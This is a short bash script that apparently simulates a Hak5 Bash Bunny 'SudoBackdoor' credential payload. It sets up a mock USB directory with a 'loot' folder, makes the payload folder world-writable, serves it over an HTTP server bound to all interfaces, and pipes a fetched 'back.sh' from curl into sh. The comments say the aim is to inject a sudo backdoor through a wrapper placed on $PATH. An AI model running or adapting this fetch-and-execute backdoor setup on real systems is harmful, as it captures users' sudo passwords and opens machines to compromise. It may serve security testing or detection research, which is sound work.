#!/bin/bash
# Inspired via: https://github.com/hak5/bashbunny-payloads/blob/27d63ad5a535510b20787cc03850b28bbdb727ee/payloads/library/credentials/SudoBackdoor/injector/payload.txt

# Inject a sudo backdoor by installing a wrapper
# inside .config/sudo/ and sourcing the dir
# in the $PATH.

# Create fake Bash Bunny USB drive directory
MOCK_BASH_BUNNY_USB_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$MOCK_BASH_BUNNY_USB_DIR/payloads/SudoBackdoor/injector
LOOT_DIR=$MOCK_BASH_BUNNY_USB_DIR/loot/SudoBackdoor
mkdir -p $MOCK_BASH_BUNNY_USB_DIR $PAYLOAD_DIR $LOOT_DIR

chmod 777 $PAYLOAD_DIR

# Create http server to host payloads
python3 -m http.server 8081 --directory $PAYLOAD_DIR --bind 0.0.0.0 > /dev/null 2>&1 &

# wait until port is listening
while ! nc -z localhost 8081; do sleep 0.2; done

curl --noproxy '*' --silent "http://localhost:8081/back.sh" | sh
